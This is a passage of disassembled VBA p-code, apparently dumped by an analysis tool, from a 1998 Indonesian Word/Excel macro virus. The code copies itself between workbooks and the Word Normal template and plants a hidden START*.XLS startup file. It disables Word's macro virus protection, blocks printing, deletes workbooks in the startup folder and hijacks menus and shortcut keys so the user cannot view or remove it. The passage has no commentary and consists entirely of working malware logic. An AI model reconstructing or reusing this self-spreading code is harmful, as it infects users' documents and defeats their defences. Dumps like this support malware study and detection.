' 	LitDI2 0x0058 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #121:
' 	ElseBlock 
' Line #122:
' 	LitDI2 0x0058 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' Line #123:
' 	ArgsCall Serang 0x0000 
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	EndSub 
' Line #126:
' 	FuncDefn (Sub FilePrintDefault())
' Line #127:
' 	ArgsCall FilePrint 0x0000 
' Line #128:
' 	EndSub 
' Line #129:
' 	FuncDefn (Sub ToolsCustomizeKeyboard())
' Line #130:
' 	ArgsCall Serang 0x0000 
' Line #131:
' 	EndSub 
' Line #132:
' 	FuncDefn (Sub ViewCode())
' Line #133:
' 	ArgsCall Serang 0x0000 
' Line #134:
' 	EndSub 
' Line #135:
' 	FuncDefn (Sub ViewVBcode())
' Line #136:
' 	Ld PWords 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ShowVisualBasicEditor 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall Serang 0x0000 
' 	EndIf 
' Line #137:
' 	EndSub 
' Line #138:
' 	FuncDefn (Sub ToolsCustomize())
' Line #139:
' 	ArgsCall Serang 0x0000 
' Line #140:
' 	EndSub 
' Line #141:
' 	FuncDefn (Sub ToolsMacro())
' Line #142:
' 	ArgsCall Serang 0x0000 
' Line #143:
' 	EndSub 
' Line #144:
' 	FuncDefn (Sub FormatStyle())
' Line #145:
' 	Ld KeyWord 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x00B4 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall Serang 0x0000 
' 	EndIf 
' Line #146:
' 	EndSub 
' Line #147:
' 	FuncDefn (Sub ToolsRecordMacroToggle())
' Line #148:
' 	ArgsCall Serang 0x0000 
' Line #149:
' 	EndSub 
' Line #150:
' 	FuncDefn (Sub FileTemplates())
' Line #151:
' 	ArgsCall Serang 0x0000 
' Line #152:
' 	EndSub 
' Line #153:
' 	FuncDefn (Private Sub ExportXls())
' Line #154:
' 	Dim 
' 	VarDefn xlsApp
' Line #155:
' 	Dim 
' 	VarDefn strFile (As String)
' Line #156:
' 	Ld regApp 
' 	Ld regSecApp 
' 	LitStr 0x000F "Microsoft Excel"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x0004 "True"
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #157:
' 	OnError Salah 
' 	BoS 0x0000 
' Line #158:
' 	SetStmt 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set xlsApp 
' Line #159:
' 	Ld xlsApp 
' 	MemLd Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #160:
' 	Ld xlsApp 
' 	MemLd StartupPath 
' 	Ld xlsApp 
' 	MemLd PathSeparator 
' 	Concat 
' 	LitStr 0x0005 "START"
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	St strFile 
' Line #161:
' 	Ld strFile 
' 	Ld xlsApp 
' 	MemLd ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0001 
' Line #162:
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	St TempPath 
' Line #163:
' 	Ld NormalTemplate 
' 	LitStr 0x0005 "START"
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Ld xlsApp 
' 	ArgsMemLd Workbooks 0x0001 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	ArgsCall EIKModul 0x0003 
' Line #164:
' 	Ld TempVer 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0005 "START"
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Ld xlsApp 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemSt New 
' Line #165:
' 	LitVarSpecial (False)
' 	Ld xlsApp 
' 	MemLd ActiveWindow 
' 	MemSt Visible 
' Line #166:
' 	LitStr 0x0005 "START"
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Ld xlsApp 
' 	ArgsMemLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #167:
' 	Ld xlsApp 
' 	MemLd Application 
' 	ArgsMemCall Quit 0x0000 
' Line #168:
' 	Ld regApp 
' 	Ld regSecApp 
' 	LitStr 0x000F "Microsoft Excel"
' 	LitStr 0x0004 "True"
' 	ArgsCall SaveSetting 0x0004 
' Line #169:
' 	EndIfBlock 
' Line #170:
' 	Label Salah 
' Line #171:
' 	EndSub 
' Line #172:
' 	FuncDefn (Sub ExportDok())
' Line #173:
' 	Dim 
' 	VarDefn dokApp
' Line #174:
' 	Ld regApp 
' 	Ld regSecApp 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x0004 "True"
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #175:
' 	OnError Salah 
' Line #176:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set dokApp 
' Line #177:
' 	Ld Application 
' 	MemLd TemplatePath 
' 	St TempPath 
' Line #178:
' 	LitStr 0x0005 "START"
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	ArgsLd Workbooks 0x0001 
' 	Ld dokApp 
' 	MemLd NormalTemplate 
' 	ArgsCall KompProject 0x0002 
' Line #179:
' 	LitVarSpecial (True)
' 	Ld dokApp 
' 	MemLd Application 
' 	ArgsMemCall Quit 0x0001 
' Line #180:
' 	Ld regApp 
' 	Ld regSecApp 
' 	LitStr 0x000E "Microsoft Word"
' 	LitStr 0x0004 "True"
' 	ArgsCall SaveSetting 0x0004 
' Line #181:
' 	EndIfBlock 
' Line #182:
' 	Label Salah 
' Line #183:
' 	EndSub 
' Line #184:
' 	FuncDefn (Sub Auto_Open())
' Line #185:
' 	OnError (Resume Next) 
' Line #186:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #187:
' 	ArgsCall XlsActive 0x0000 
' Line #188:
' 	ArgsCall ExportDok 0x0000 
' Line #189:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #190:
' 	EndSub 
' Line #191:
' 	FuncDefn (Private Sub AllWorkBook())
' Line #192:
' 	LitVarSpecial (False)
' 	St blnMod 
' Line #193:
' 	StartForVariable 
' 	Ld Komp 
' 	EndForVariable 
' 	Ld Workbooks 
' 	ForEach 
' Line #194:
' 	Ld Komp 
' 	MemLd New 
' 	St actWindow 
' Line #195:
' 	Ld actWindow 
' 	LitStr 0x0005 "START"
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St blnMod 
' 	EndIf 
' Line #196:
' 	Ld Komp 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd StartupPath 
' 	Eq 
' 	Ld actWindow 
' 	LitStr 0x0005 "START"
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #197:
' 	LitVarSpecial (False)
' 	Ld Komp 
' 	ArgsMemCall Close 0x0001 
' Line #198:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld actWindow 
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #199:
' 	EndIfBlock 
' Line #200:
' 	StartForVariable 
' 	Ld Komp 
' 	EndForVariable 
' 	NextVar 
' Line #201:
' 	Ld blnMod 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall BuatXlsActive 0x0000 
' 	EndIf 
' Line #202:
' 	EndSub 
' Line #203:
' 	FuncDefn (Sub XlsActive())
' Line #204:
' 	OnError (Resume Next) 
' Line #205:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #206:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #207:
' 	ArgsCall CreateEvents 0x0000 
' Line #208:
' 	ArgsCall TempActive 0x0000 
' Line #209:
' 	ArgsCall AllWorkBook 0x0000 
' Line #210:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt OnSheetActivate 
' Line #211:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt OnSheetDeactivate 
' Line #212:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt OnWindow 
' Line #213:
' 	ArgsCall MenuExcel 0x0000 
' Line #214:
' 	LitStr 0x0005 "START"
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	LitStr 0x000A "!XlsActive"
' 	Concat 
' 	Ld Application 
' 	MemSt OnWindow 
' Line #215:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #216:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #217:
' 	EndSub 
' Line #218:
' 	FuncDefn (Sub TempActive())
' Line #219:
' 	OnError (Resume Next) 
' Line #220:
' 	ArgsCall Aplikasi 0x0000 
' Line #221:
' 	Ld Temp 
' 	Ld Active 
' 	ArgsLd KompProject 0x0002 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #222:
' 	ArgsCall SetCusProp 0x0000 
' Line #223:
' 	Ld MacName 
' 	Ld Active 
' 	MemLd VBProject 
' 	MemSt New 
' Line #224:
' 	Ld Active 
' 	MemLd Path 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Active 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #225:
' 	EndIfBlock 
' Line #226:
' 	EndSub 
' Line #227:
' 	FuncDefn (Function EIKModul(Asal, Tujuan, Komp As String) As Boolean)
' Line #228:
' 	OnError Salah 
' Line #229:
' 	Ld TempPath 
' 	Ld Komp 
' 	Concat 
' 	Ld Komp 
' 	Ld Asal 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #230:
' 	Ld TempPath 
' 	Ld Komp 
' 	Concat 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #231:
' 	LitVarSpecial (True)
' 	St EIKModul 
' Line #232:
' 	Ld TempPath 
' 	Ld Komp 
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #233:
' 	Label Salah 
' Line #234:
' 	EndFunc 
' Line #235:
' 	FuncDefn (Sub OpenFile())
' Line #236:
' 	OnError (Resume Next) 
' Line #237:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #238:
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #239:
' 	ArgsCall XlsActive 0x0000 
' Line #240:
' 	EndSub 
' Line #241:
' 	FuncDefn (Private Sub CreateEvents())
' Line #242:
' 	Dim 
' 	VarDefn vbComp
' Line #243:
' 	OnError Salah 
' Line #244:
' 	Label lanjut 
' Line #245:
' 	LitStr 0x0005 "Event"
' 	Ld ActiveWorkbook 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Value 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Ne 
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	LitStr 0x0005 "START"
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #246:
' 	OnError FatalError 
' Line #247:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set vbComp 
' Line #248:
' 	StartWithExpr 
' 	Ld vbComp 
' 	With 
' Line #249:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #250:
' 	LitDI2 0x0001 
' 	LitStr 0x0033 "Private Sub Workbook_BeforePrint(Cancel As Boolean)"
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #251:
' 	LitDI2 0x0002 
' 	LitStr 0x0014 "On Error Resume Next"
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #252:
' 	LitDI2 0x0003 
' 	LitStr 0x0018 "If PrintOke = False Then"
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #253:
' 	LitDI2 0x0004 
' 	LitStr 0x000A "    Serang"
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #254:
' 	LitDI2 0x0005 
' 	LitStr 0x0011 "    Cancel = True"
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #255:
' 	LitDI2 0x0006 
' 	LitStr 0x0006 "End if"
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #256:
' 	LitDI2 0x0007 
' 	LitStr 0x0007 "End Sub"
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #257:
' 	EndWith 
' Line #258:
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0005 "Event"
' 	Ld ActiveWorkbook 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Value 
' Line #259:
' 	EndIfBlock 
' Line #260:
' 	Label FatalError 
' Line #261:
' 	ExitSub 
' Line #262:
' 	Label Salah 
' Line #263:
' 	LitStr 0x0005 "Event"
' 	Paren 
' 	LitVarSpecial (False)
' 	LitDI2 0x0004 
' 	LitStr 0x0000 ""
' 	Ld ActiveWorkbook 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' Line #264:
' 	Resume lanjut 
' Line #265:
' 	EndSub 
' Line #266:
' 	FuncDefn (Sub BuatXlsActive())
' Line #267:
' 	Dim 
' 	VarDefn Baru (As String)
' Line #268:
' 	OnError (Resume Next) 
' Line #269:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #270:
' 	Ld Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #271:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	LitStr 0x0005 "START"
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	St Baru 
' Line #272:
' 	Ld Baru 
' 	Ld ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0001 
' Line #273:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #274:
' 	ArgsCall ActiveTemp 0x0000 
' Line #275:
' 	EndSub 
' Line #276:
' 	FuncDefn (Sub ActiveTemp())
' Line #277:
' 	OnError (Resume Next) 
' Line #278:
' 	ArgsCall Aplikasi 0x0000 
' Line #279:
' 	Ld Active 
' 	Ld Temp 
' 	ArgsLd KompProject 0x0002 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #280:
' 	Ld TempVer 
' 	Ld Ver 
' 	Concat 
' 	Ld Temp 
' 	MemLd VBProject 
' 	MemSt New 
' Line #281:
' 	Ld Temp 
' 	ArgsMemCall Save 0x0000 
' Line #282:
' 	Ld regApp 
' 	Ld regSecApp 
' 	Ld Application 
' 	MemLd New 
' 	LitStr 0x0004 "True"
' 	ArgsCall SaveSetting 0x0004 
' Line #283:
' 	LitVarSpecial (True)
' 	St blnFound 
' Line #284:
' 	EndIfBlock 
' Line #285:
' 	EndSub 
' Line #286:
' 	FuncDefn (Sub MenuExcel())
' Line #287:
' 	OnError (Resume Next) 
' Line #288:
' 	StartForVariable 
' 	Ld ctl 
' 	EndForVariable 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	Ld CommandBars 
' 	MemLd ActiveMenuBar 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemLd Controls 
' 	ForEach 
' Line #289:
' 	LitStr 0x0006 "Serang"
' 	Ld ctl 
' 	MemSt OnAction 
' Line #290:
' 	StartForVariable 
' 	Ld ctl 
' 	EndForVariable 
' 	NextVar 
' Line #291:
' 	ArgsCall WordExcel 0x0000 
' Line #292:
' 	LitStr 0x0009 "View Code"
' 	LitStr 0x0003 "Ply"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #293:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #294:
' 	LitStr 0x0006 "%{F11}"
' 	LitStr 0x0006 "Serang"
' 	ArgsMemCallWith OnKey 0x0002 
' Line #295:
' 	LitStr 0x0005 "%{F8}"
' 	LitStr 0x0006 "Serang"
' 	ArgsMemCallWith OnKey 0x0002 
' Line #296:
' 	LitStr 0x0005 "%{F2}"
' 	LitStr 0x0006 "Serang"
' 	ArgsMemCallWith OnKey 0x0002 
' Line #297:
' 	LitStr 0x0005 "%{F4}"
' 	LitStr 0x0006 "Serang"
' 	ArgsMemCallWith OnKey 0x0002 
' Line #298:
' 	LitStr 0x0005 "{F12}"
' 	LitStr 0x0006 "Serang"
' 	ArgsMemCallWith OnKey 0x0002 
' Line #299:
' 	LitStr 0x0004 "^{o}"
' 	LitStr 0x0008 "OpenFile"
' 	ArgsMemCallWith OnKey 0x0002 
' Line #300:
' 	EndWith 
' Line #301:
' 	LitStr 0x0008 "OpenFile"
' 	LitStr 0x0004 "Open"
' 	LitStr 0x0008 "Standard"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #302:
' 	LitStr 0x0008 "OpenFile"
' 	LitStr 0x0007 "Open..."
' 	LitStr 0x0004 "File"
' 	LitStr 0x0012 "Worksheet Menu Bar"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #303:
' 	EndSub 
' Line #304:
' 	FuncDefn (Sub WordExcel())
' Line #305:
' 	OnError (Resume Next) 
' Line #306:
' 	LitStr 0x000F "Control Toolbox"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #307:
' 	LitStr 0x0005 "Forms"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #308:
' 	LitStr 0x000F "ActiveX Control"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #309:
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #310:
' 	Ld CommandBars 
' 	MemLd ActiveMenuBar 
' 	LitVarSpecial (False)
' 	ArgsCall cmdBars 0x0002 
' Line #311:
' 	LitStr 0x000A "Formatting"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (False)
' 	ArgsCall cmdBars 0x0002 
' Line #312:
' 	LitStr 0x0008 "Standard"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (False)
' 	ArgsCall cmdBars 0x0002 
' Line #313:
' 	EndSub 
' Line #314:
' 	FuncDefn (Sub cmdBars(cmd, blnVis As Boolean))
' Line #315:
' 	StartWithExpr 
' 	Ld cmd 
' 	With 
' Line #316:
' 	Ld blnVis 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #317:
' 	LitVarSpecial (False)
' 	MemStWith Enabled 
' Line #318:
' 	LitVarSpecial (False)
' 	MemStWith Visible 
' Line #319:
' 	LitDI2 0x0008 
' 	MemStWith Protection 
' Line #320:
' 	EndIfBlock 
' Line #321:
' 	LitDI2 0x0001 
' 	MemStWith Protection 
' Line #322:
' 	EndWith 
' Line #323:
' 	EndSub 
' Line #324:
' 	FuncDefn (Sub MenuWord())
' Line #325:
' 	OnError (Resume Next) 
' Line #326:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #327:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #328:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #329:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #330:
' 	EndWith 
' Line #331:
' 	Ld wdKeyAlt 
' 	Ld wdKeyF8 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #332:
' 	Ld wdKeyAlt 
' 	Ld wdKeyF11 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #333:
' 	ArgsCall WordExcel 0x0000 
' Line #334:
' 	EndSub 
' Line #335:
' 	FuncDefn (Sub SetCusProp())
' Line #336:
' 	OnError (Resume Next) 
' Line #337:
' 	SetStmt 
' 	Ld Active 
' 	MemLd CustomDocumentProperties 
' 	Set CusProp 
' Line #338:
' 	LitStr 0x0006 "Author"
' 	LitVarSpecial (False)
' 	LitDI2 0x0004 
' 	LitStr 0x0000 ""
' 	Ld CusProp 
' 	ArgsMemCall Add 0x0004 
' Line #339:
' 	LitStr 0x000A "CountPrint"
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld CusProp 
' 	ArgsMemCall Add 0x0004 
' Line #340:
' 	Ld PWords 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0004 "Lina"
' 	LitStr 0x0006 "Author"
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Value 
' 	EndIf 
' Line #341:
' 	EndSub 
' Line #342:
' 	FuncDefn (Function GetCreator() As Boolean)
' Line #343:
' 	OnError Salah 
' Line #344:
' 	ArgsCall Aplikasi 0x0000 
' Line #345:
' 	SetStmt 
' 	Ld Active 
' 	MemLd CustomDocumentProperties 
' 	Set CusProp 
' Line #346:
' 	LitStr 0x0006 "Author"
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Value 
' 	LitStr 0x0004 "Lina"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St GetCreator 
' 	EndIf 
' Line #347:
' 	Label Salah 
' Line #348:
' 	EndFunc 
' Line #349:
' 	FuncDefn (Function PWords() As Boolean)
' Line #350:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000D "AuthorKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x0006 "Marsel"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PWords 
' 	EndIf 
' Line #351:
' 	EndFunc 
' Line #352:
' 	FuncDefn (Sub OnTimer())
' Line #353:
' 	ArgsCall Serang 0x0000 
' Line #354:
' 	Ld Now 
' 	Ld TimerOn 
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	LitStr 0x0007 "OnTimer"
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #355:
' 	EndSub 
' Line #356:
' 	FuncDefn (Sub FoundIt())
' Line #357:
' 	ArgsCall TempActive 0x0000 
' Line #358:
' 	LitVarSpecial (False)
' 	St blnFound 
' Line #359:
' 	EndSub 
' Line #360:
' 	FuncDefn (Sub Pesan(strPesan As String, Msg))
' Line #361:
' 	Dim 
' 	VarDefn A (As String) 0x0007
' Line #362:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0003 
' 	VarDefn B
' Line #363:
' 	Dim 
' 	VarDefn x
' 	VarDefn i
' 	VarDefn j
' Line #364:
' 	Dim 
' 	VarDefn K
' Line #365:
' 	LitStr 0x0003 "  \"
' 	LitDI2 0x0000 
' 	ArgsSt B 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "  -  "
' 	LitDI2 0x0001 
' 	ArgsSt B 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "  /"
' 	LitDI2 0x0002 
' 	ArgsSt B 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0003 "  |"
' 	LitDI2 0x0003 
' 	ArgsSt B 0x0001 
' Line #366:
' 	LitDI2 0x0000 
' 	St i 
' Line #367:
' 	Ld Bar 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0012 "Toraja High Land: "
' 	St K 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0030 "Note ... each file can be printed 5 times only: "
' 	St K 
' 	EndIf 
' Line #368:
' 	LitStr 0x008A "                                                                                                                                          "
' 	Ld strPesan 
' 	Concat 
' 	St A 
' Line #369:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld A 
' 	FnLen 
' 	For 
' Line #370:
' 	Ld A 
' 	Ld i 
' 	ArgsLd B 0x0001 
' 	Concat 
' 	Ld Msg 
' 	MemSt Caption 
' Line #371:
' 	Ld K 
' 	Ld Akhir 
' 	Ld Timer 
' 	Ld Waktu 
' 	Sub 
' 	FnInt 
' 	Sub 
' 	Concat 
' 	LitStr 0x0005 " sec "
' 	Concat 
' 	Ld i 
' 	ArgsLd B 0x0001 
' 	Concat 
' 	Ld Application 
' 	MemSt StatusBar 
' Line #372:
' 	Ld A 
' 	Ld A 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Right$ 0x0002 
' 	St A 
' Line #373:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #374:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x49F0 0x0002 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Next 
' Line #375:
' 	Ld Timer 
' 	Ld Waktu 
' 	Sub 
' 	Ld Akhir 
' 	Ge 
' 	Paren 
' 	Ld Timer 
' 	Ld Waktu 
' 	Sub 
' 	LitDI2 0x0000 
' 	Lt 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	GoTo done 
' 	EndIf 
' Line #376:
' 	Ld i 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St i 
' 	EndIf 
' Line #377:
' 	StartForVariable 
' 	Next 
' Line #378:
' 	Label done 
' Line #379:
' 	Ld Bar 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Bar 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	St Bar 
' 	EndIf 
' Line #380:
' 	LitStr 0x0000 ""
' 	Ld Msg 
' 	MemSt Caption 
' Line #381:
' 	EndSub 
' Line #382:
' 	FuncDefn (Sub Message(Msg))
' Line #383:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0005 
' 	VarDefn strPesan (As String)
' Line #384:
' 	LitStr 0x0008 "Hello, ["
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x002A "] I did't expect to meet you here, sorry. "
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsSt strPesan 0x0001 
' Line #385:
' 	LitStr 0x004E "Warning ... one or more your Word and Excel command(s) maybe not available now"
' 	LitDI2 0x0001 
' 	ArgsSt strPesan 0x0001 
' Line #386:
' 	Ld Date 
' 	LitStr 0x000A "dd-mm-yyyy"
' 	ArgsLd Format$ 0x0002 
' 	ArgsLd Year 0x0001 
' 	LitDI2 0x0002 
' 	ArgsSt strPesan 0x0001 
' Line #387:
' 	LitStr 0x0017 "Marry Christmas [25-12-"
' 	LitDI2 0x0003 
' 	ArgsSt strPesan 0x0001 
' Line #388:
' 	LitStr 0x001C "] and happy new year [01-01-"
' 	LitDI2 0x0004 
' 	ArgsSt strPesan 0x0001 
' Line #389:
' 	LitStr 0x0044 "Member of Mountain Software. Created 1998 South Sulawesi - Indonesia"
' 	LitDI2 0x0005 
' 	ArgsSt strPesan 0x0001 
' Line #390:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	SelectCase 
' Line #391:
' 	LitDI2 0x000B 
' 	Case 
' 	LitDI2 0x000C 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd strPesan 0x0001 
' 	LitDI2 0x0003 
' 	ArgsLd strPesan 0x0001 
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsLd strPesan 0x0001 
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd strPesan 0x0001 
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsLd strPesan 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	Concat 
' 	LitStr 0x0001 "]"
' 	Concat 
' 	LitDI2 0x0000 
' 	ArgsSt strPesan 0x0001 
' Line #392:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd strPesan 0x0001 
